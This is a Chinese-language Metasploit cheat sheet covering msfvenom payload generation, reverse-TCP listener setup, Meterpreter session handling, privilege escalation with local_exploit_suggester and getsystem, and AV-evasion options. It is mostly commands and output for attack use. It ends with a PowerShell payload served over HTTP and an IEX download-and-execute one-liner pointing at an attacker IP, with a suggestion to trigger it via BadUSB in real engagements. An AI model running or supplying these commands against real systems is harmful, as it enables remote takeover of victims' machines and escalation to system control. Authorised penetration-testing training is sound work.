
```bash
msfvenom   //生成载荷
msfconsole  //监听 
```


## Msfvenom常用命令
1. 知道目标操作系统，然后寻找payload
```bash
msfvenom --list payloads | grep windows  #知道目标操作系统

-------

cmd/windows/down ----- 执行某个特定功能
windws/..A../.B.tcp  --- 完整的一个shell
	A -- 常用X64
	B -- 监听类型
		meter..../...  一些基础功能，之后按需要再下载dll
		meter..._...   直接all
```
![](media/Pasted%20image%2020251029105955.png)
2. 生成载荷
```bash
msfvenom --list formats #查看有什么格式
	Executable Formats -- 触发就可以执行 ，不好修改
	Transform Formats -- Shellcode 
			Hex / RAW  --- 图片 伪装
			常用C / Golang

msfvenom  -p  windows/x64/me...tcp lhost=<kali ip> lport=<监听端口> -f <格式> -o 输出文件

msfvenom  -p  windows/x64/me...tcp lhost=<kali ip> lport=<监听端口> -f exe -o 1.exe
```


## Msfconsole常用命令

### 设置监听
- 简易设置
```bash
msfconsole

handler -p windows/meterpreter/reverse_tcp -H 0.0.0.0 -P 4444   # 设置监听 

jobs  # 查看监听

jobs -k ID  # 关闭监听
```
- Advanced设置
```bash
use exploit/multi/handler

msf6 exploit(multi/handler) > show options  # 查看设置选项
	Payload options (generic/shell_reverse_tcp):
	   Name   Current Setting  Required  Description
	   ----   ---------------  --------  -----------
		 LHOST                   yes       The listen address ......
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp # 设置Payload
set lhost 0.0.0.0  # 设置 host

msf6 exploit(multi/handler) > show advanced # Advanced设置 （过免杀会用到）
	Module advanced options (exploit/multi/handler):
   Name                    Current Setting  Required  Description
   ----                    ---------------  --------  -----------
   ContextInformationFile                   no        The information file that contains context information
   DisablePayloadHandler   false            no        Disable the handler code for the selected payload
   EnableContextEncoding   false            no        Use transient context when encoding payloads
   ExitOnSession           true             yes       Return from the exploit after a session has been created
   ListenerTimeout         0                no        The maximum number of seconds to wait for new sessions
   VERBOSE                 false            no        Enable detailed status messages
   WORKSPACE                                no        Specify the workspace for this module
   WfsDelay                2                no        Additional delay in seconds to wait for a session
	Payload advanced options (windows/meterpreter/reverse_tcp):
   Name                         Current Setting  Required  Description
```
### 开始监听

- 开始监听
```bash
exploit -j
```


### 查看会话
```bash
msf6 exploit(multi/handler) > sessions 
    Active sessions
    ===============
      Id  Name  Type                     Information  Connection
      --  ----  ----                     -----------  ----------
      1         meterpreter x86/windows               192.168.1.5:4444 -> 192.168.1.3:57536 (192.168.1.3)

```

1. 进入会话
```bash
sessions -i ID

?  # 查看帮助

load -l  # 看看可以拉什么模块

load stdapi #拉取stdapi模块

bg # 返回MSf主界面
```

###  提权
```bash
search suggest

use post/multi/recon/local_exploit_suggester  # 该模块会 尝试所有可以提权的模块（Recon侦测）

set session 1 # 设置提权模块用到什么session

exploit #运行

选择一个可以用的提权模块 （Exp模块）
use xxxxxxxx
set session 1 
exploit

session -i 2
getsystem #提权
```

### 监听Powershell
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.182.135 lport=4444 -f psh -o a

python3 -m http.server 80   
```
触发powershell代码(实战中可以使用badusb)

```bash
IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/a'))
```


